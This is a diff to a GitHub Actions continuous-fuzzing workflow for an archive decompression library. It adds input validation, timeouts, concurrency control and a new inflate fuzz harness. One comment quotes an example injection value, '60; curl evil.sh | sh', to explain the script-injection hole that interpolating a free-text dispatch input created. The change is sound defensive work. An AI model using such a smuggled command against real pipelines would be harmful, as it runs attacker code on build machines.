@@ -10,10 +10,21 @@ on:
         required: false
         default: '60'
 
+# build.yml has this; fuzz.yml did not. Without it a manual dispatch that
+# overlaps the nightly runs two jobs that both write tests/fuzz/seeds/ and
+# both save distinct cache keys.
+concurrency:
+  group: fuzz-${{ github.ref }}
+  cancel-in-progress: false
+
 jobs:
   fuzz:
     name: Continuous Fuzzing
     runs-on: ubuntu-latest
+    # The harnesses are wall-clock bounded (-max_total_time, validated above)
+    # and -timeout caps any single input, but a wedged harness or a stuck
+    # setup step would otherwise burn the full 6 h default ceiling.
+    timeout-minutes: 120
     env:
       UBSAN_OPTIONS: halt_on_error=1
       ASAN_OPTIONS: detect_leaks=1
@@ -27,7 +38,33 @@ jobs:
         run: |
           mkdir -p tests/fuzz/seeds
           mkdir -p tests/fuzz/extra_seeds
-          cp tests/*.rar tests/fuzz/extra_seeds/
+          shopt -s nullglob
+          seeds=(tests/*.rar)
+          if [ ${#seeds[@]} -eq 0 ]; then
+            echo "::error::no tests/*.rar fixtures found to seed the corpus"
+            exit 1
+          fi
+          cp "${seeds[@]}" tests/fuzz/extra_seeds/
+
+      - name: Validate fuzz duration
+        # workflow_dispatch inputs are free text. This value used to be
+        # interpolated straight into the `run:` script of each harness, so a
+        # dispatch with duration `60; curl evil.sh | sh` would have executed
+        # as shell. Validate it once here, then reference it only as the
+        # quoted shell variable "$FUZZ_TIME" - never as a template expansion.
+        run: |
+          set -euo pipefail
+          if ! [[ "$FUZZ_TIME" =~ ^[0-9]+$ ]]; then
+            echo "::error::duration must be an integer in [10, 86400], got '$FUZZ_TIME'"
+            exit 1
+          fi
+          # 10# forces base 10; without it a leading zero makes bash read the
+          # value as octal, so '060' would silently mean 48 seconds.
+          if (( 10#$FUZZ_TIME < 10 || 10#$FUZZ_TIME > 86400 )); then
+            echo "::error::duration must be an integer in [10, 86400], got '$FUZZ_TIME'"
+            exit 1
+          fi
+          echo "fuzz duration: $((10#$FUZZ_TIME))s per harness"
 
       - name: Restore fuzzer corpus
         # Persist the corpus across nightly runs so coverage accumulates
@@ -93,17 +130,29 @@ jobs:
         # (valid RAR5 header shapes; libFuzzer writes new units only into the first dir).
         # -timeout=60 tolerates hostile lg2_count=24 PBKDF2 derivations (~seconds)
         # in the file-handle harness without flagging them as timeouts.
-        run: ./build_fuzz/fuzz_decompress -max_total_time=${{ env.FUZZ_TIME }} tests/fuzz/seeds/ tests/fuzz/extra_seeds/
+        # -timeout=60 on every harness, not just the file-handle one:
+        # -max_total_time is only checked BETWEEN runs, so without it
+        # libFuzzer's 1200 s default applies per input and one hostile input
+        # can consume the whole budget and report nothing.
+        run: ./build_fuzz/fuzz_decompress -max_total_time="$FUZZ_TIME" -timeout=60 tests/fuzz/seeds/ tests/fuzz/extra_seeds/
 
       - name: Fuzz archive + block C ABI
-        run: ./build_fuzz/fuzz_archive -max_total_time=${{ env.FUZZ_TIME }} tests/fuzz/seeds/ tests/fuzz/extra_seeds/
+        run: ./build_fuzz/fuzz_archive -max_total_time="$FUZZ_TIME" -timeout=60 tests/fuzz/seeds/ tests/fuzz/extra_seeds/
+
+      - name: Fuzz inflate (deflate decoder)
+        # fuzz_inflate was already a real libFuzzer target (CMakeLists.txt)
+        # and was already asserted-to-build in the loop above, but no step
+        # ever executed it and it is not in the ctest sweep either. It
+        # covers the only DEFLATE decoder in the tree, which foreign_zip
+        # feeds attacker-controlled streams.
+        run: ./build_fuzz/fuzz_inflate -max_total_time="$FUZZ_TIME" -timeout=60 tests/fuzz/seeds/ tests/fuzz/extra_seeds/
 
       - name: Fuzz file-based surface
         # open_file / handle_extract_to_path / handle_test / list_file_pw over
         # the streaming reader: volume scan, extent stitching, chunked decrypt,
         # solid catch-up. Archives are materialised to disk with hostile
         # naming variants per input (see tests/fuzz/fuzz_file_handle.cpp).
-        run: ./build_fuzz/fuzz_file_handle -max_total_time=${{ env.FUZZ_TIME }} -timeout=60 tests/fuzz/seeds/ tests/fuzz/extra_seeds/
+        run: ./build_fuzz/fuzz_file_handle -max_total_time="$FUZZ_TIME" -timeout=60 tests/fuzz/seeds/ tests/fuzz/extra_seeds/
 
       - name: Dedup crashes (stack-signature buckets; new buckets survive)
         if: always()
